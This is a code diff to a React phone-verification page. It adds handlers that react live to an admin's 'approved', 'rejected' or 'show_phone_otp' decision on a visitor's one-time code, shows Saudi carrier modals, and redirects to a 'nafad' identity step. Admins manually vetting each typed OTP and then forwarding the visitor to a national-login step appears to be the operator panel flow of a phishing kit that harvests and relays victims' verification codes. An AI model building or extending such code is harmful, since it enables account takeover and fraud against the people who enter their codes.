@@ -70,6 +70,23 @@ export default function VerifyPhonePage() {
         else if (status === '_st1') window.location.href = '/check'
         else if (status === '_t2') window.location.href = '/step2'
         else if (status === '_t3') window.location.href = '/step3'
+      } else if (field === 'phoneOtpStatus') {
+        console.log('[phone-info] Phone OTP Status Update:', status)
+        if (status === 'approved') {
+          console.log('[phone-info] Phone OTP approved by admin')
+          handleApproved()
+        } else if (status === 'rejected') {
+          console.log('[phone-info] Phone OTP rejected by admin')
+          handleOtpRejected()
+        } else if (status === 'show_phone_otp') {
+          console.log('[phone-info] Admin requested to show phone OTP dialog (resend)')
+          // Close waiting modals and reopen OTP dialog
+          setShowStcModal(false)
+          setShowMobilyModal(false)
+          setShowCarrierModal(false)
+          setShowPhoneOtpDialog(true)
+          setOtpRejectionError('تم إعادة إرسال رمز التحقق. يرجى إدخال الرمز الجديد')
+        }
       }
     })
 
@@ -172,6 +189,7 @@ export default function VerifyPhonePage() {
     setShowStcModal(false)
     setShowMobilyModal(false)
     setShowCarrierModal(false)
+    setShowPhoneOtpDialog(false)
     
     // Navigate to nafad page
     window.location.href = "/step4"
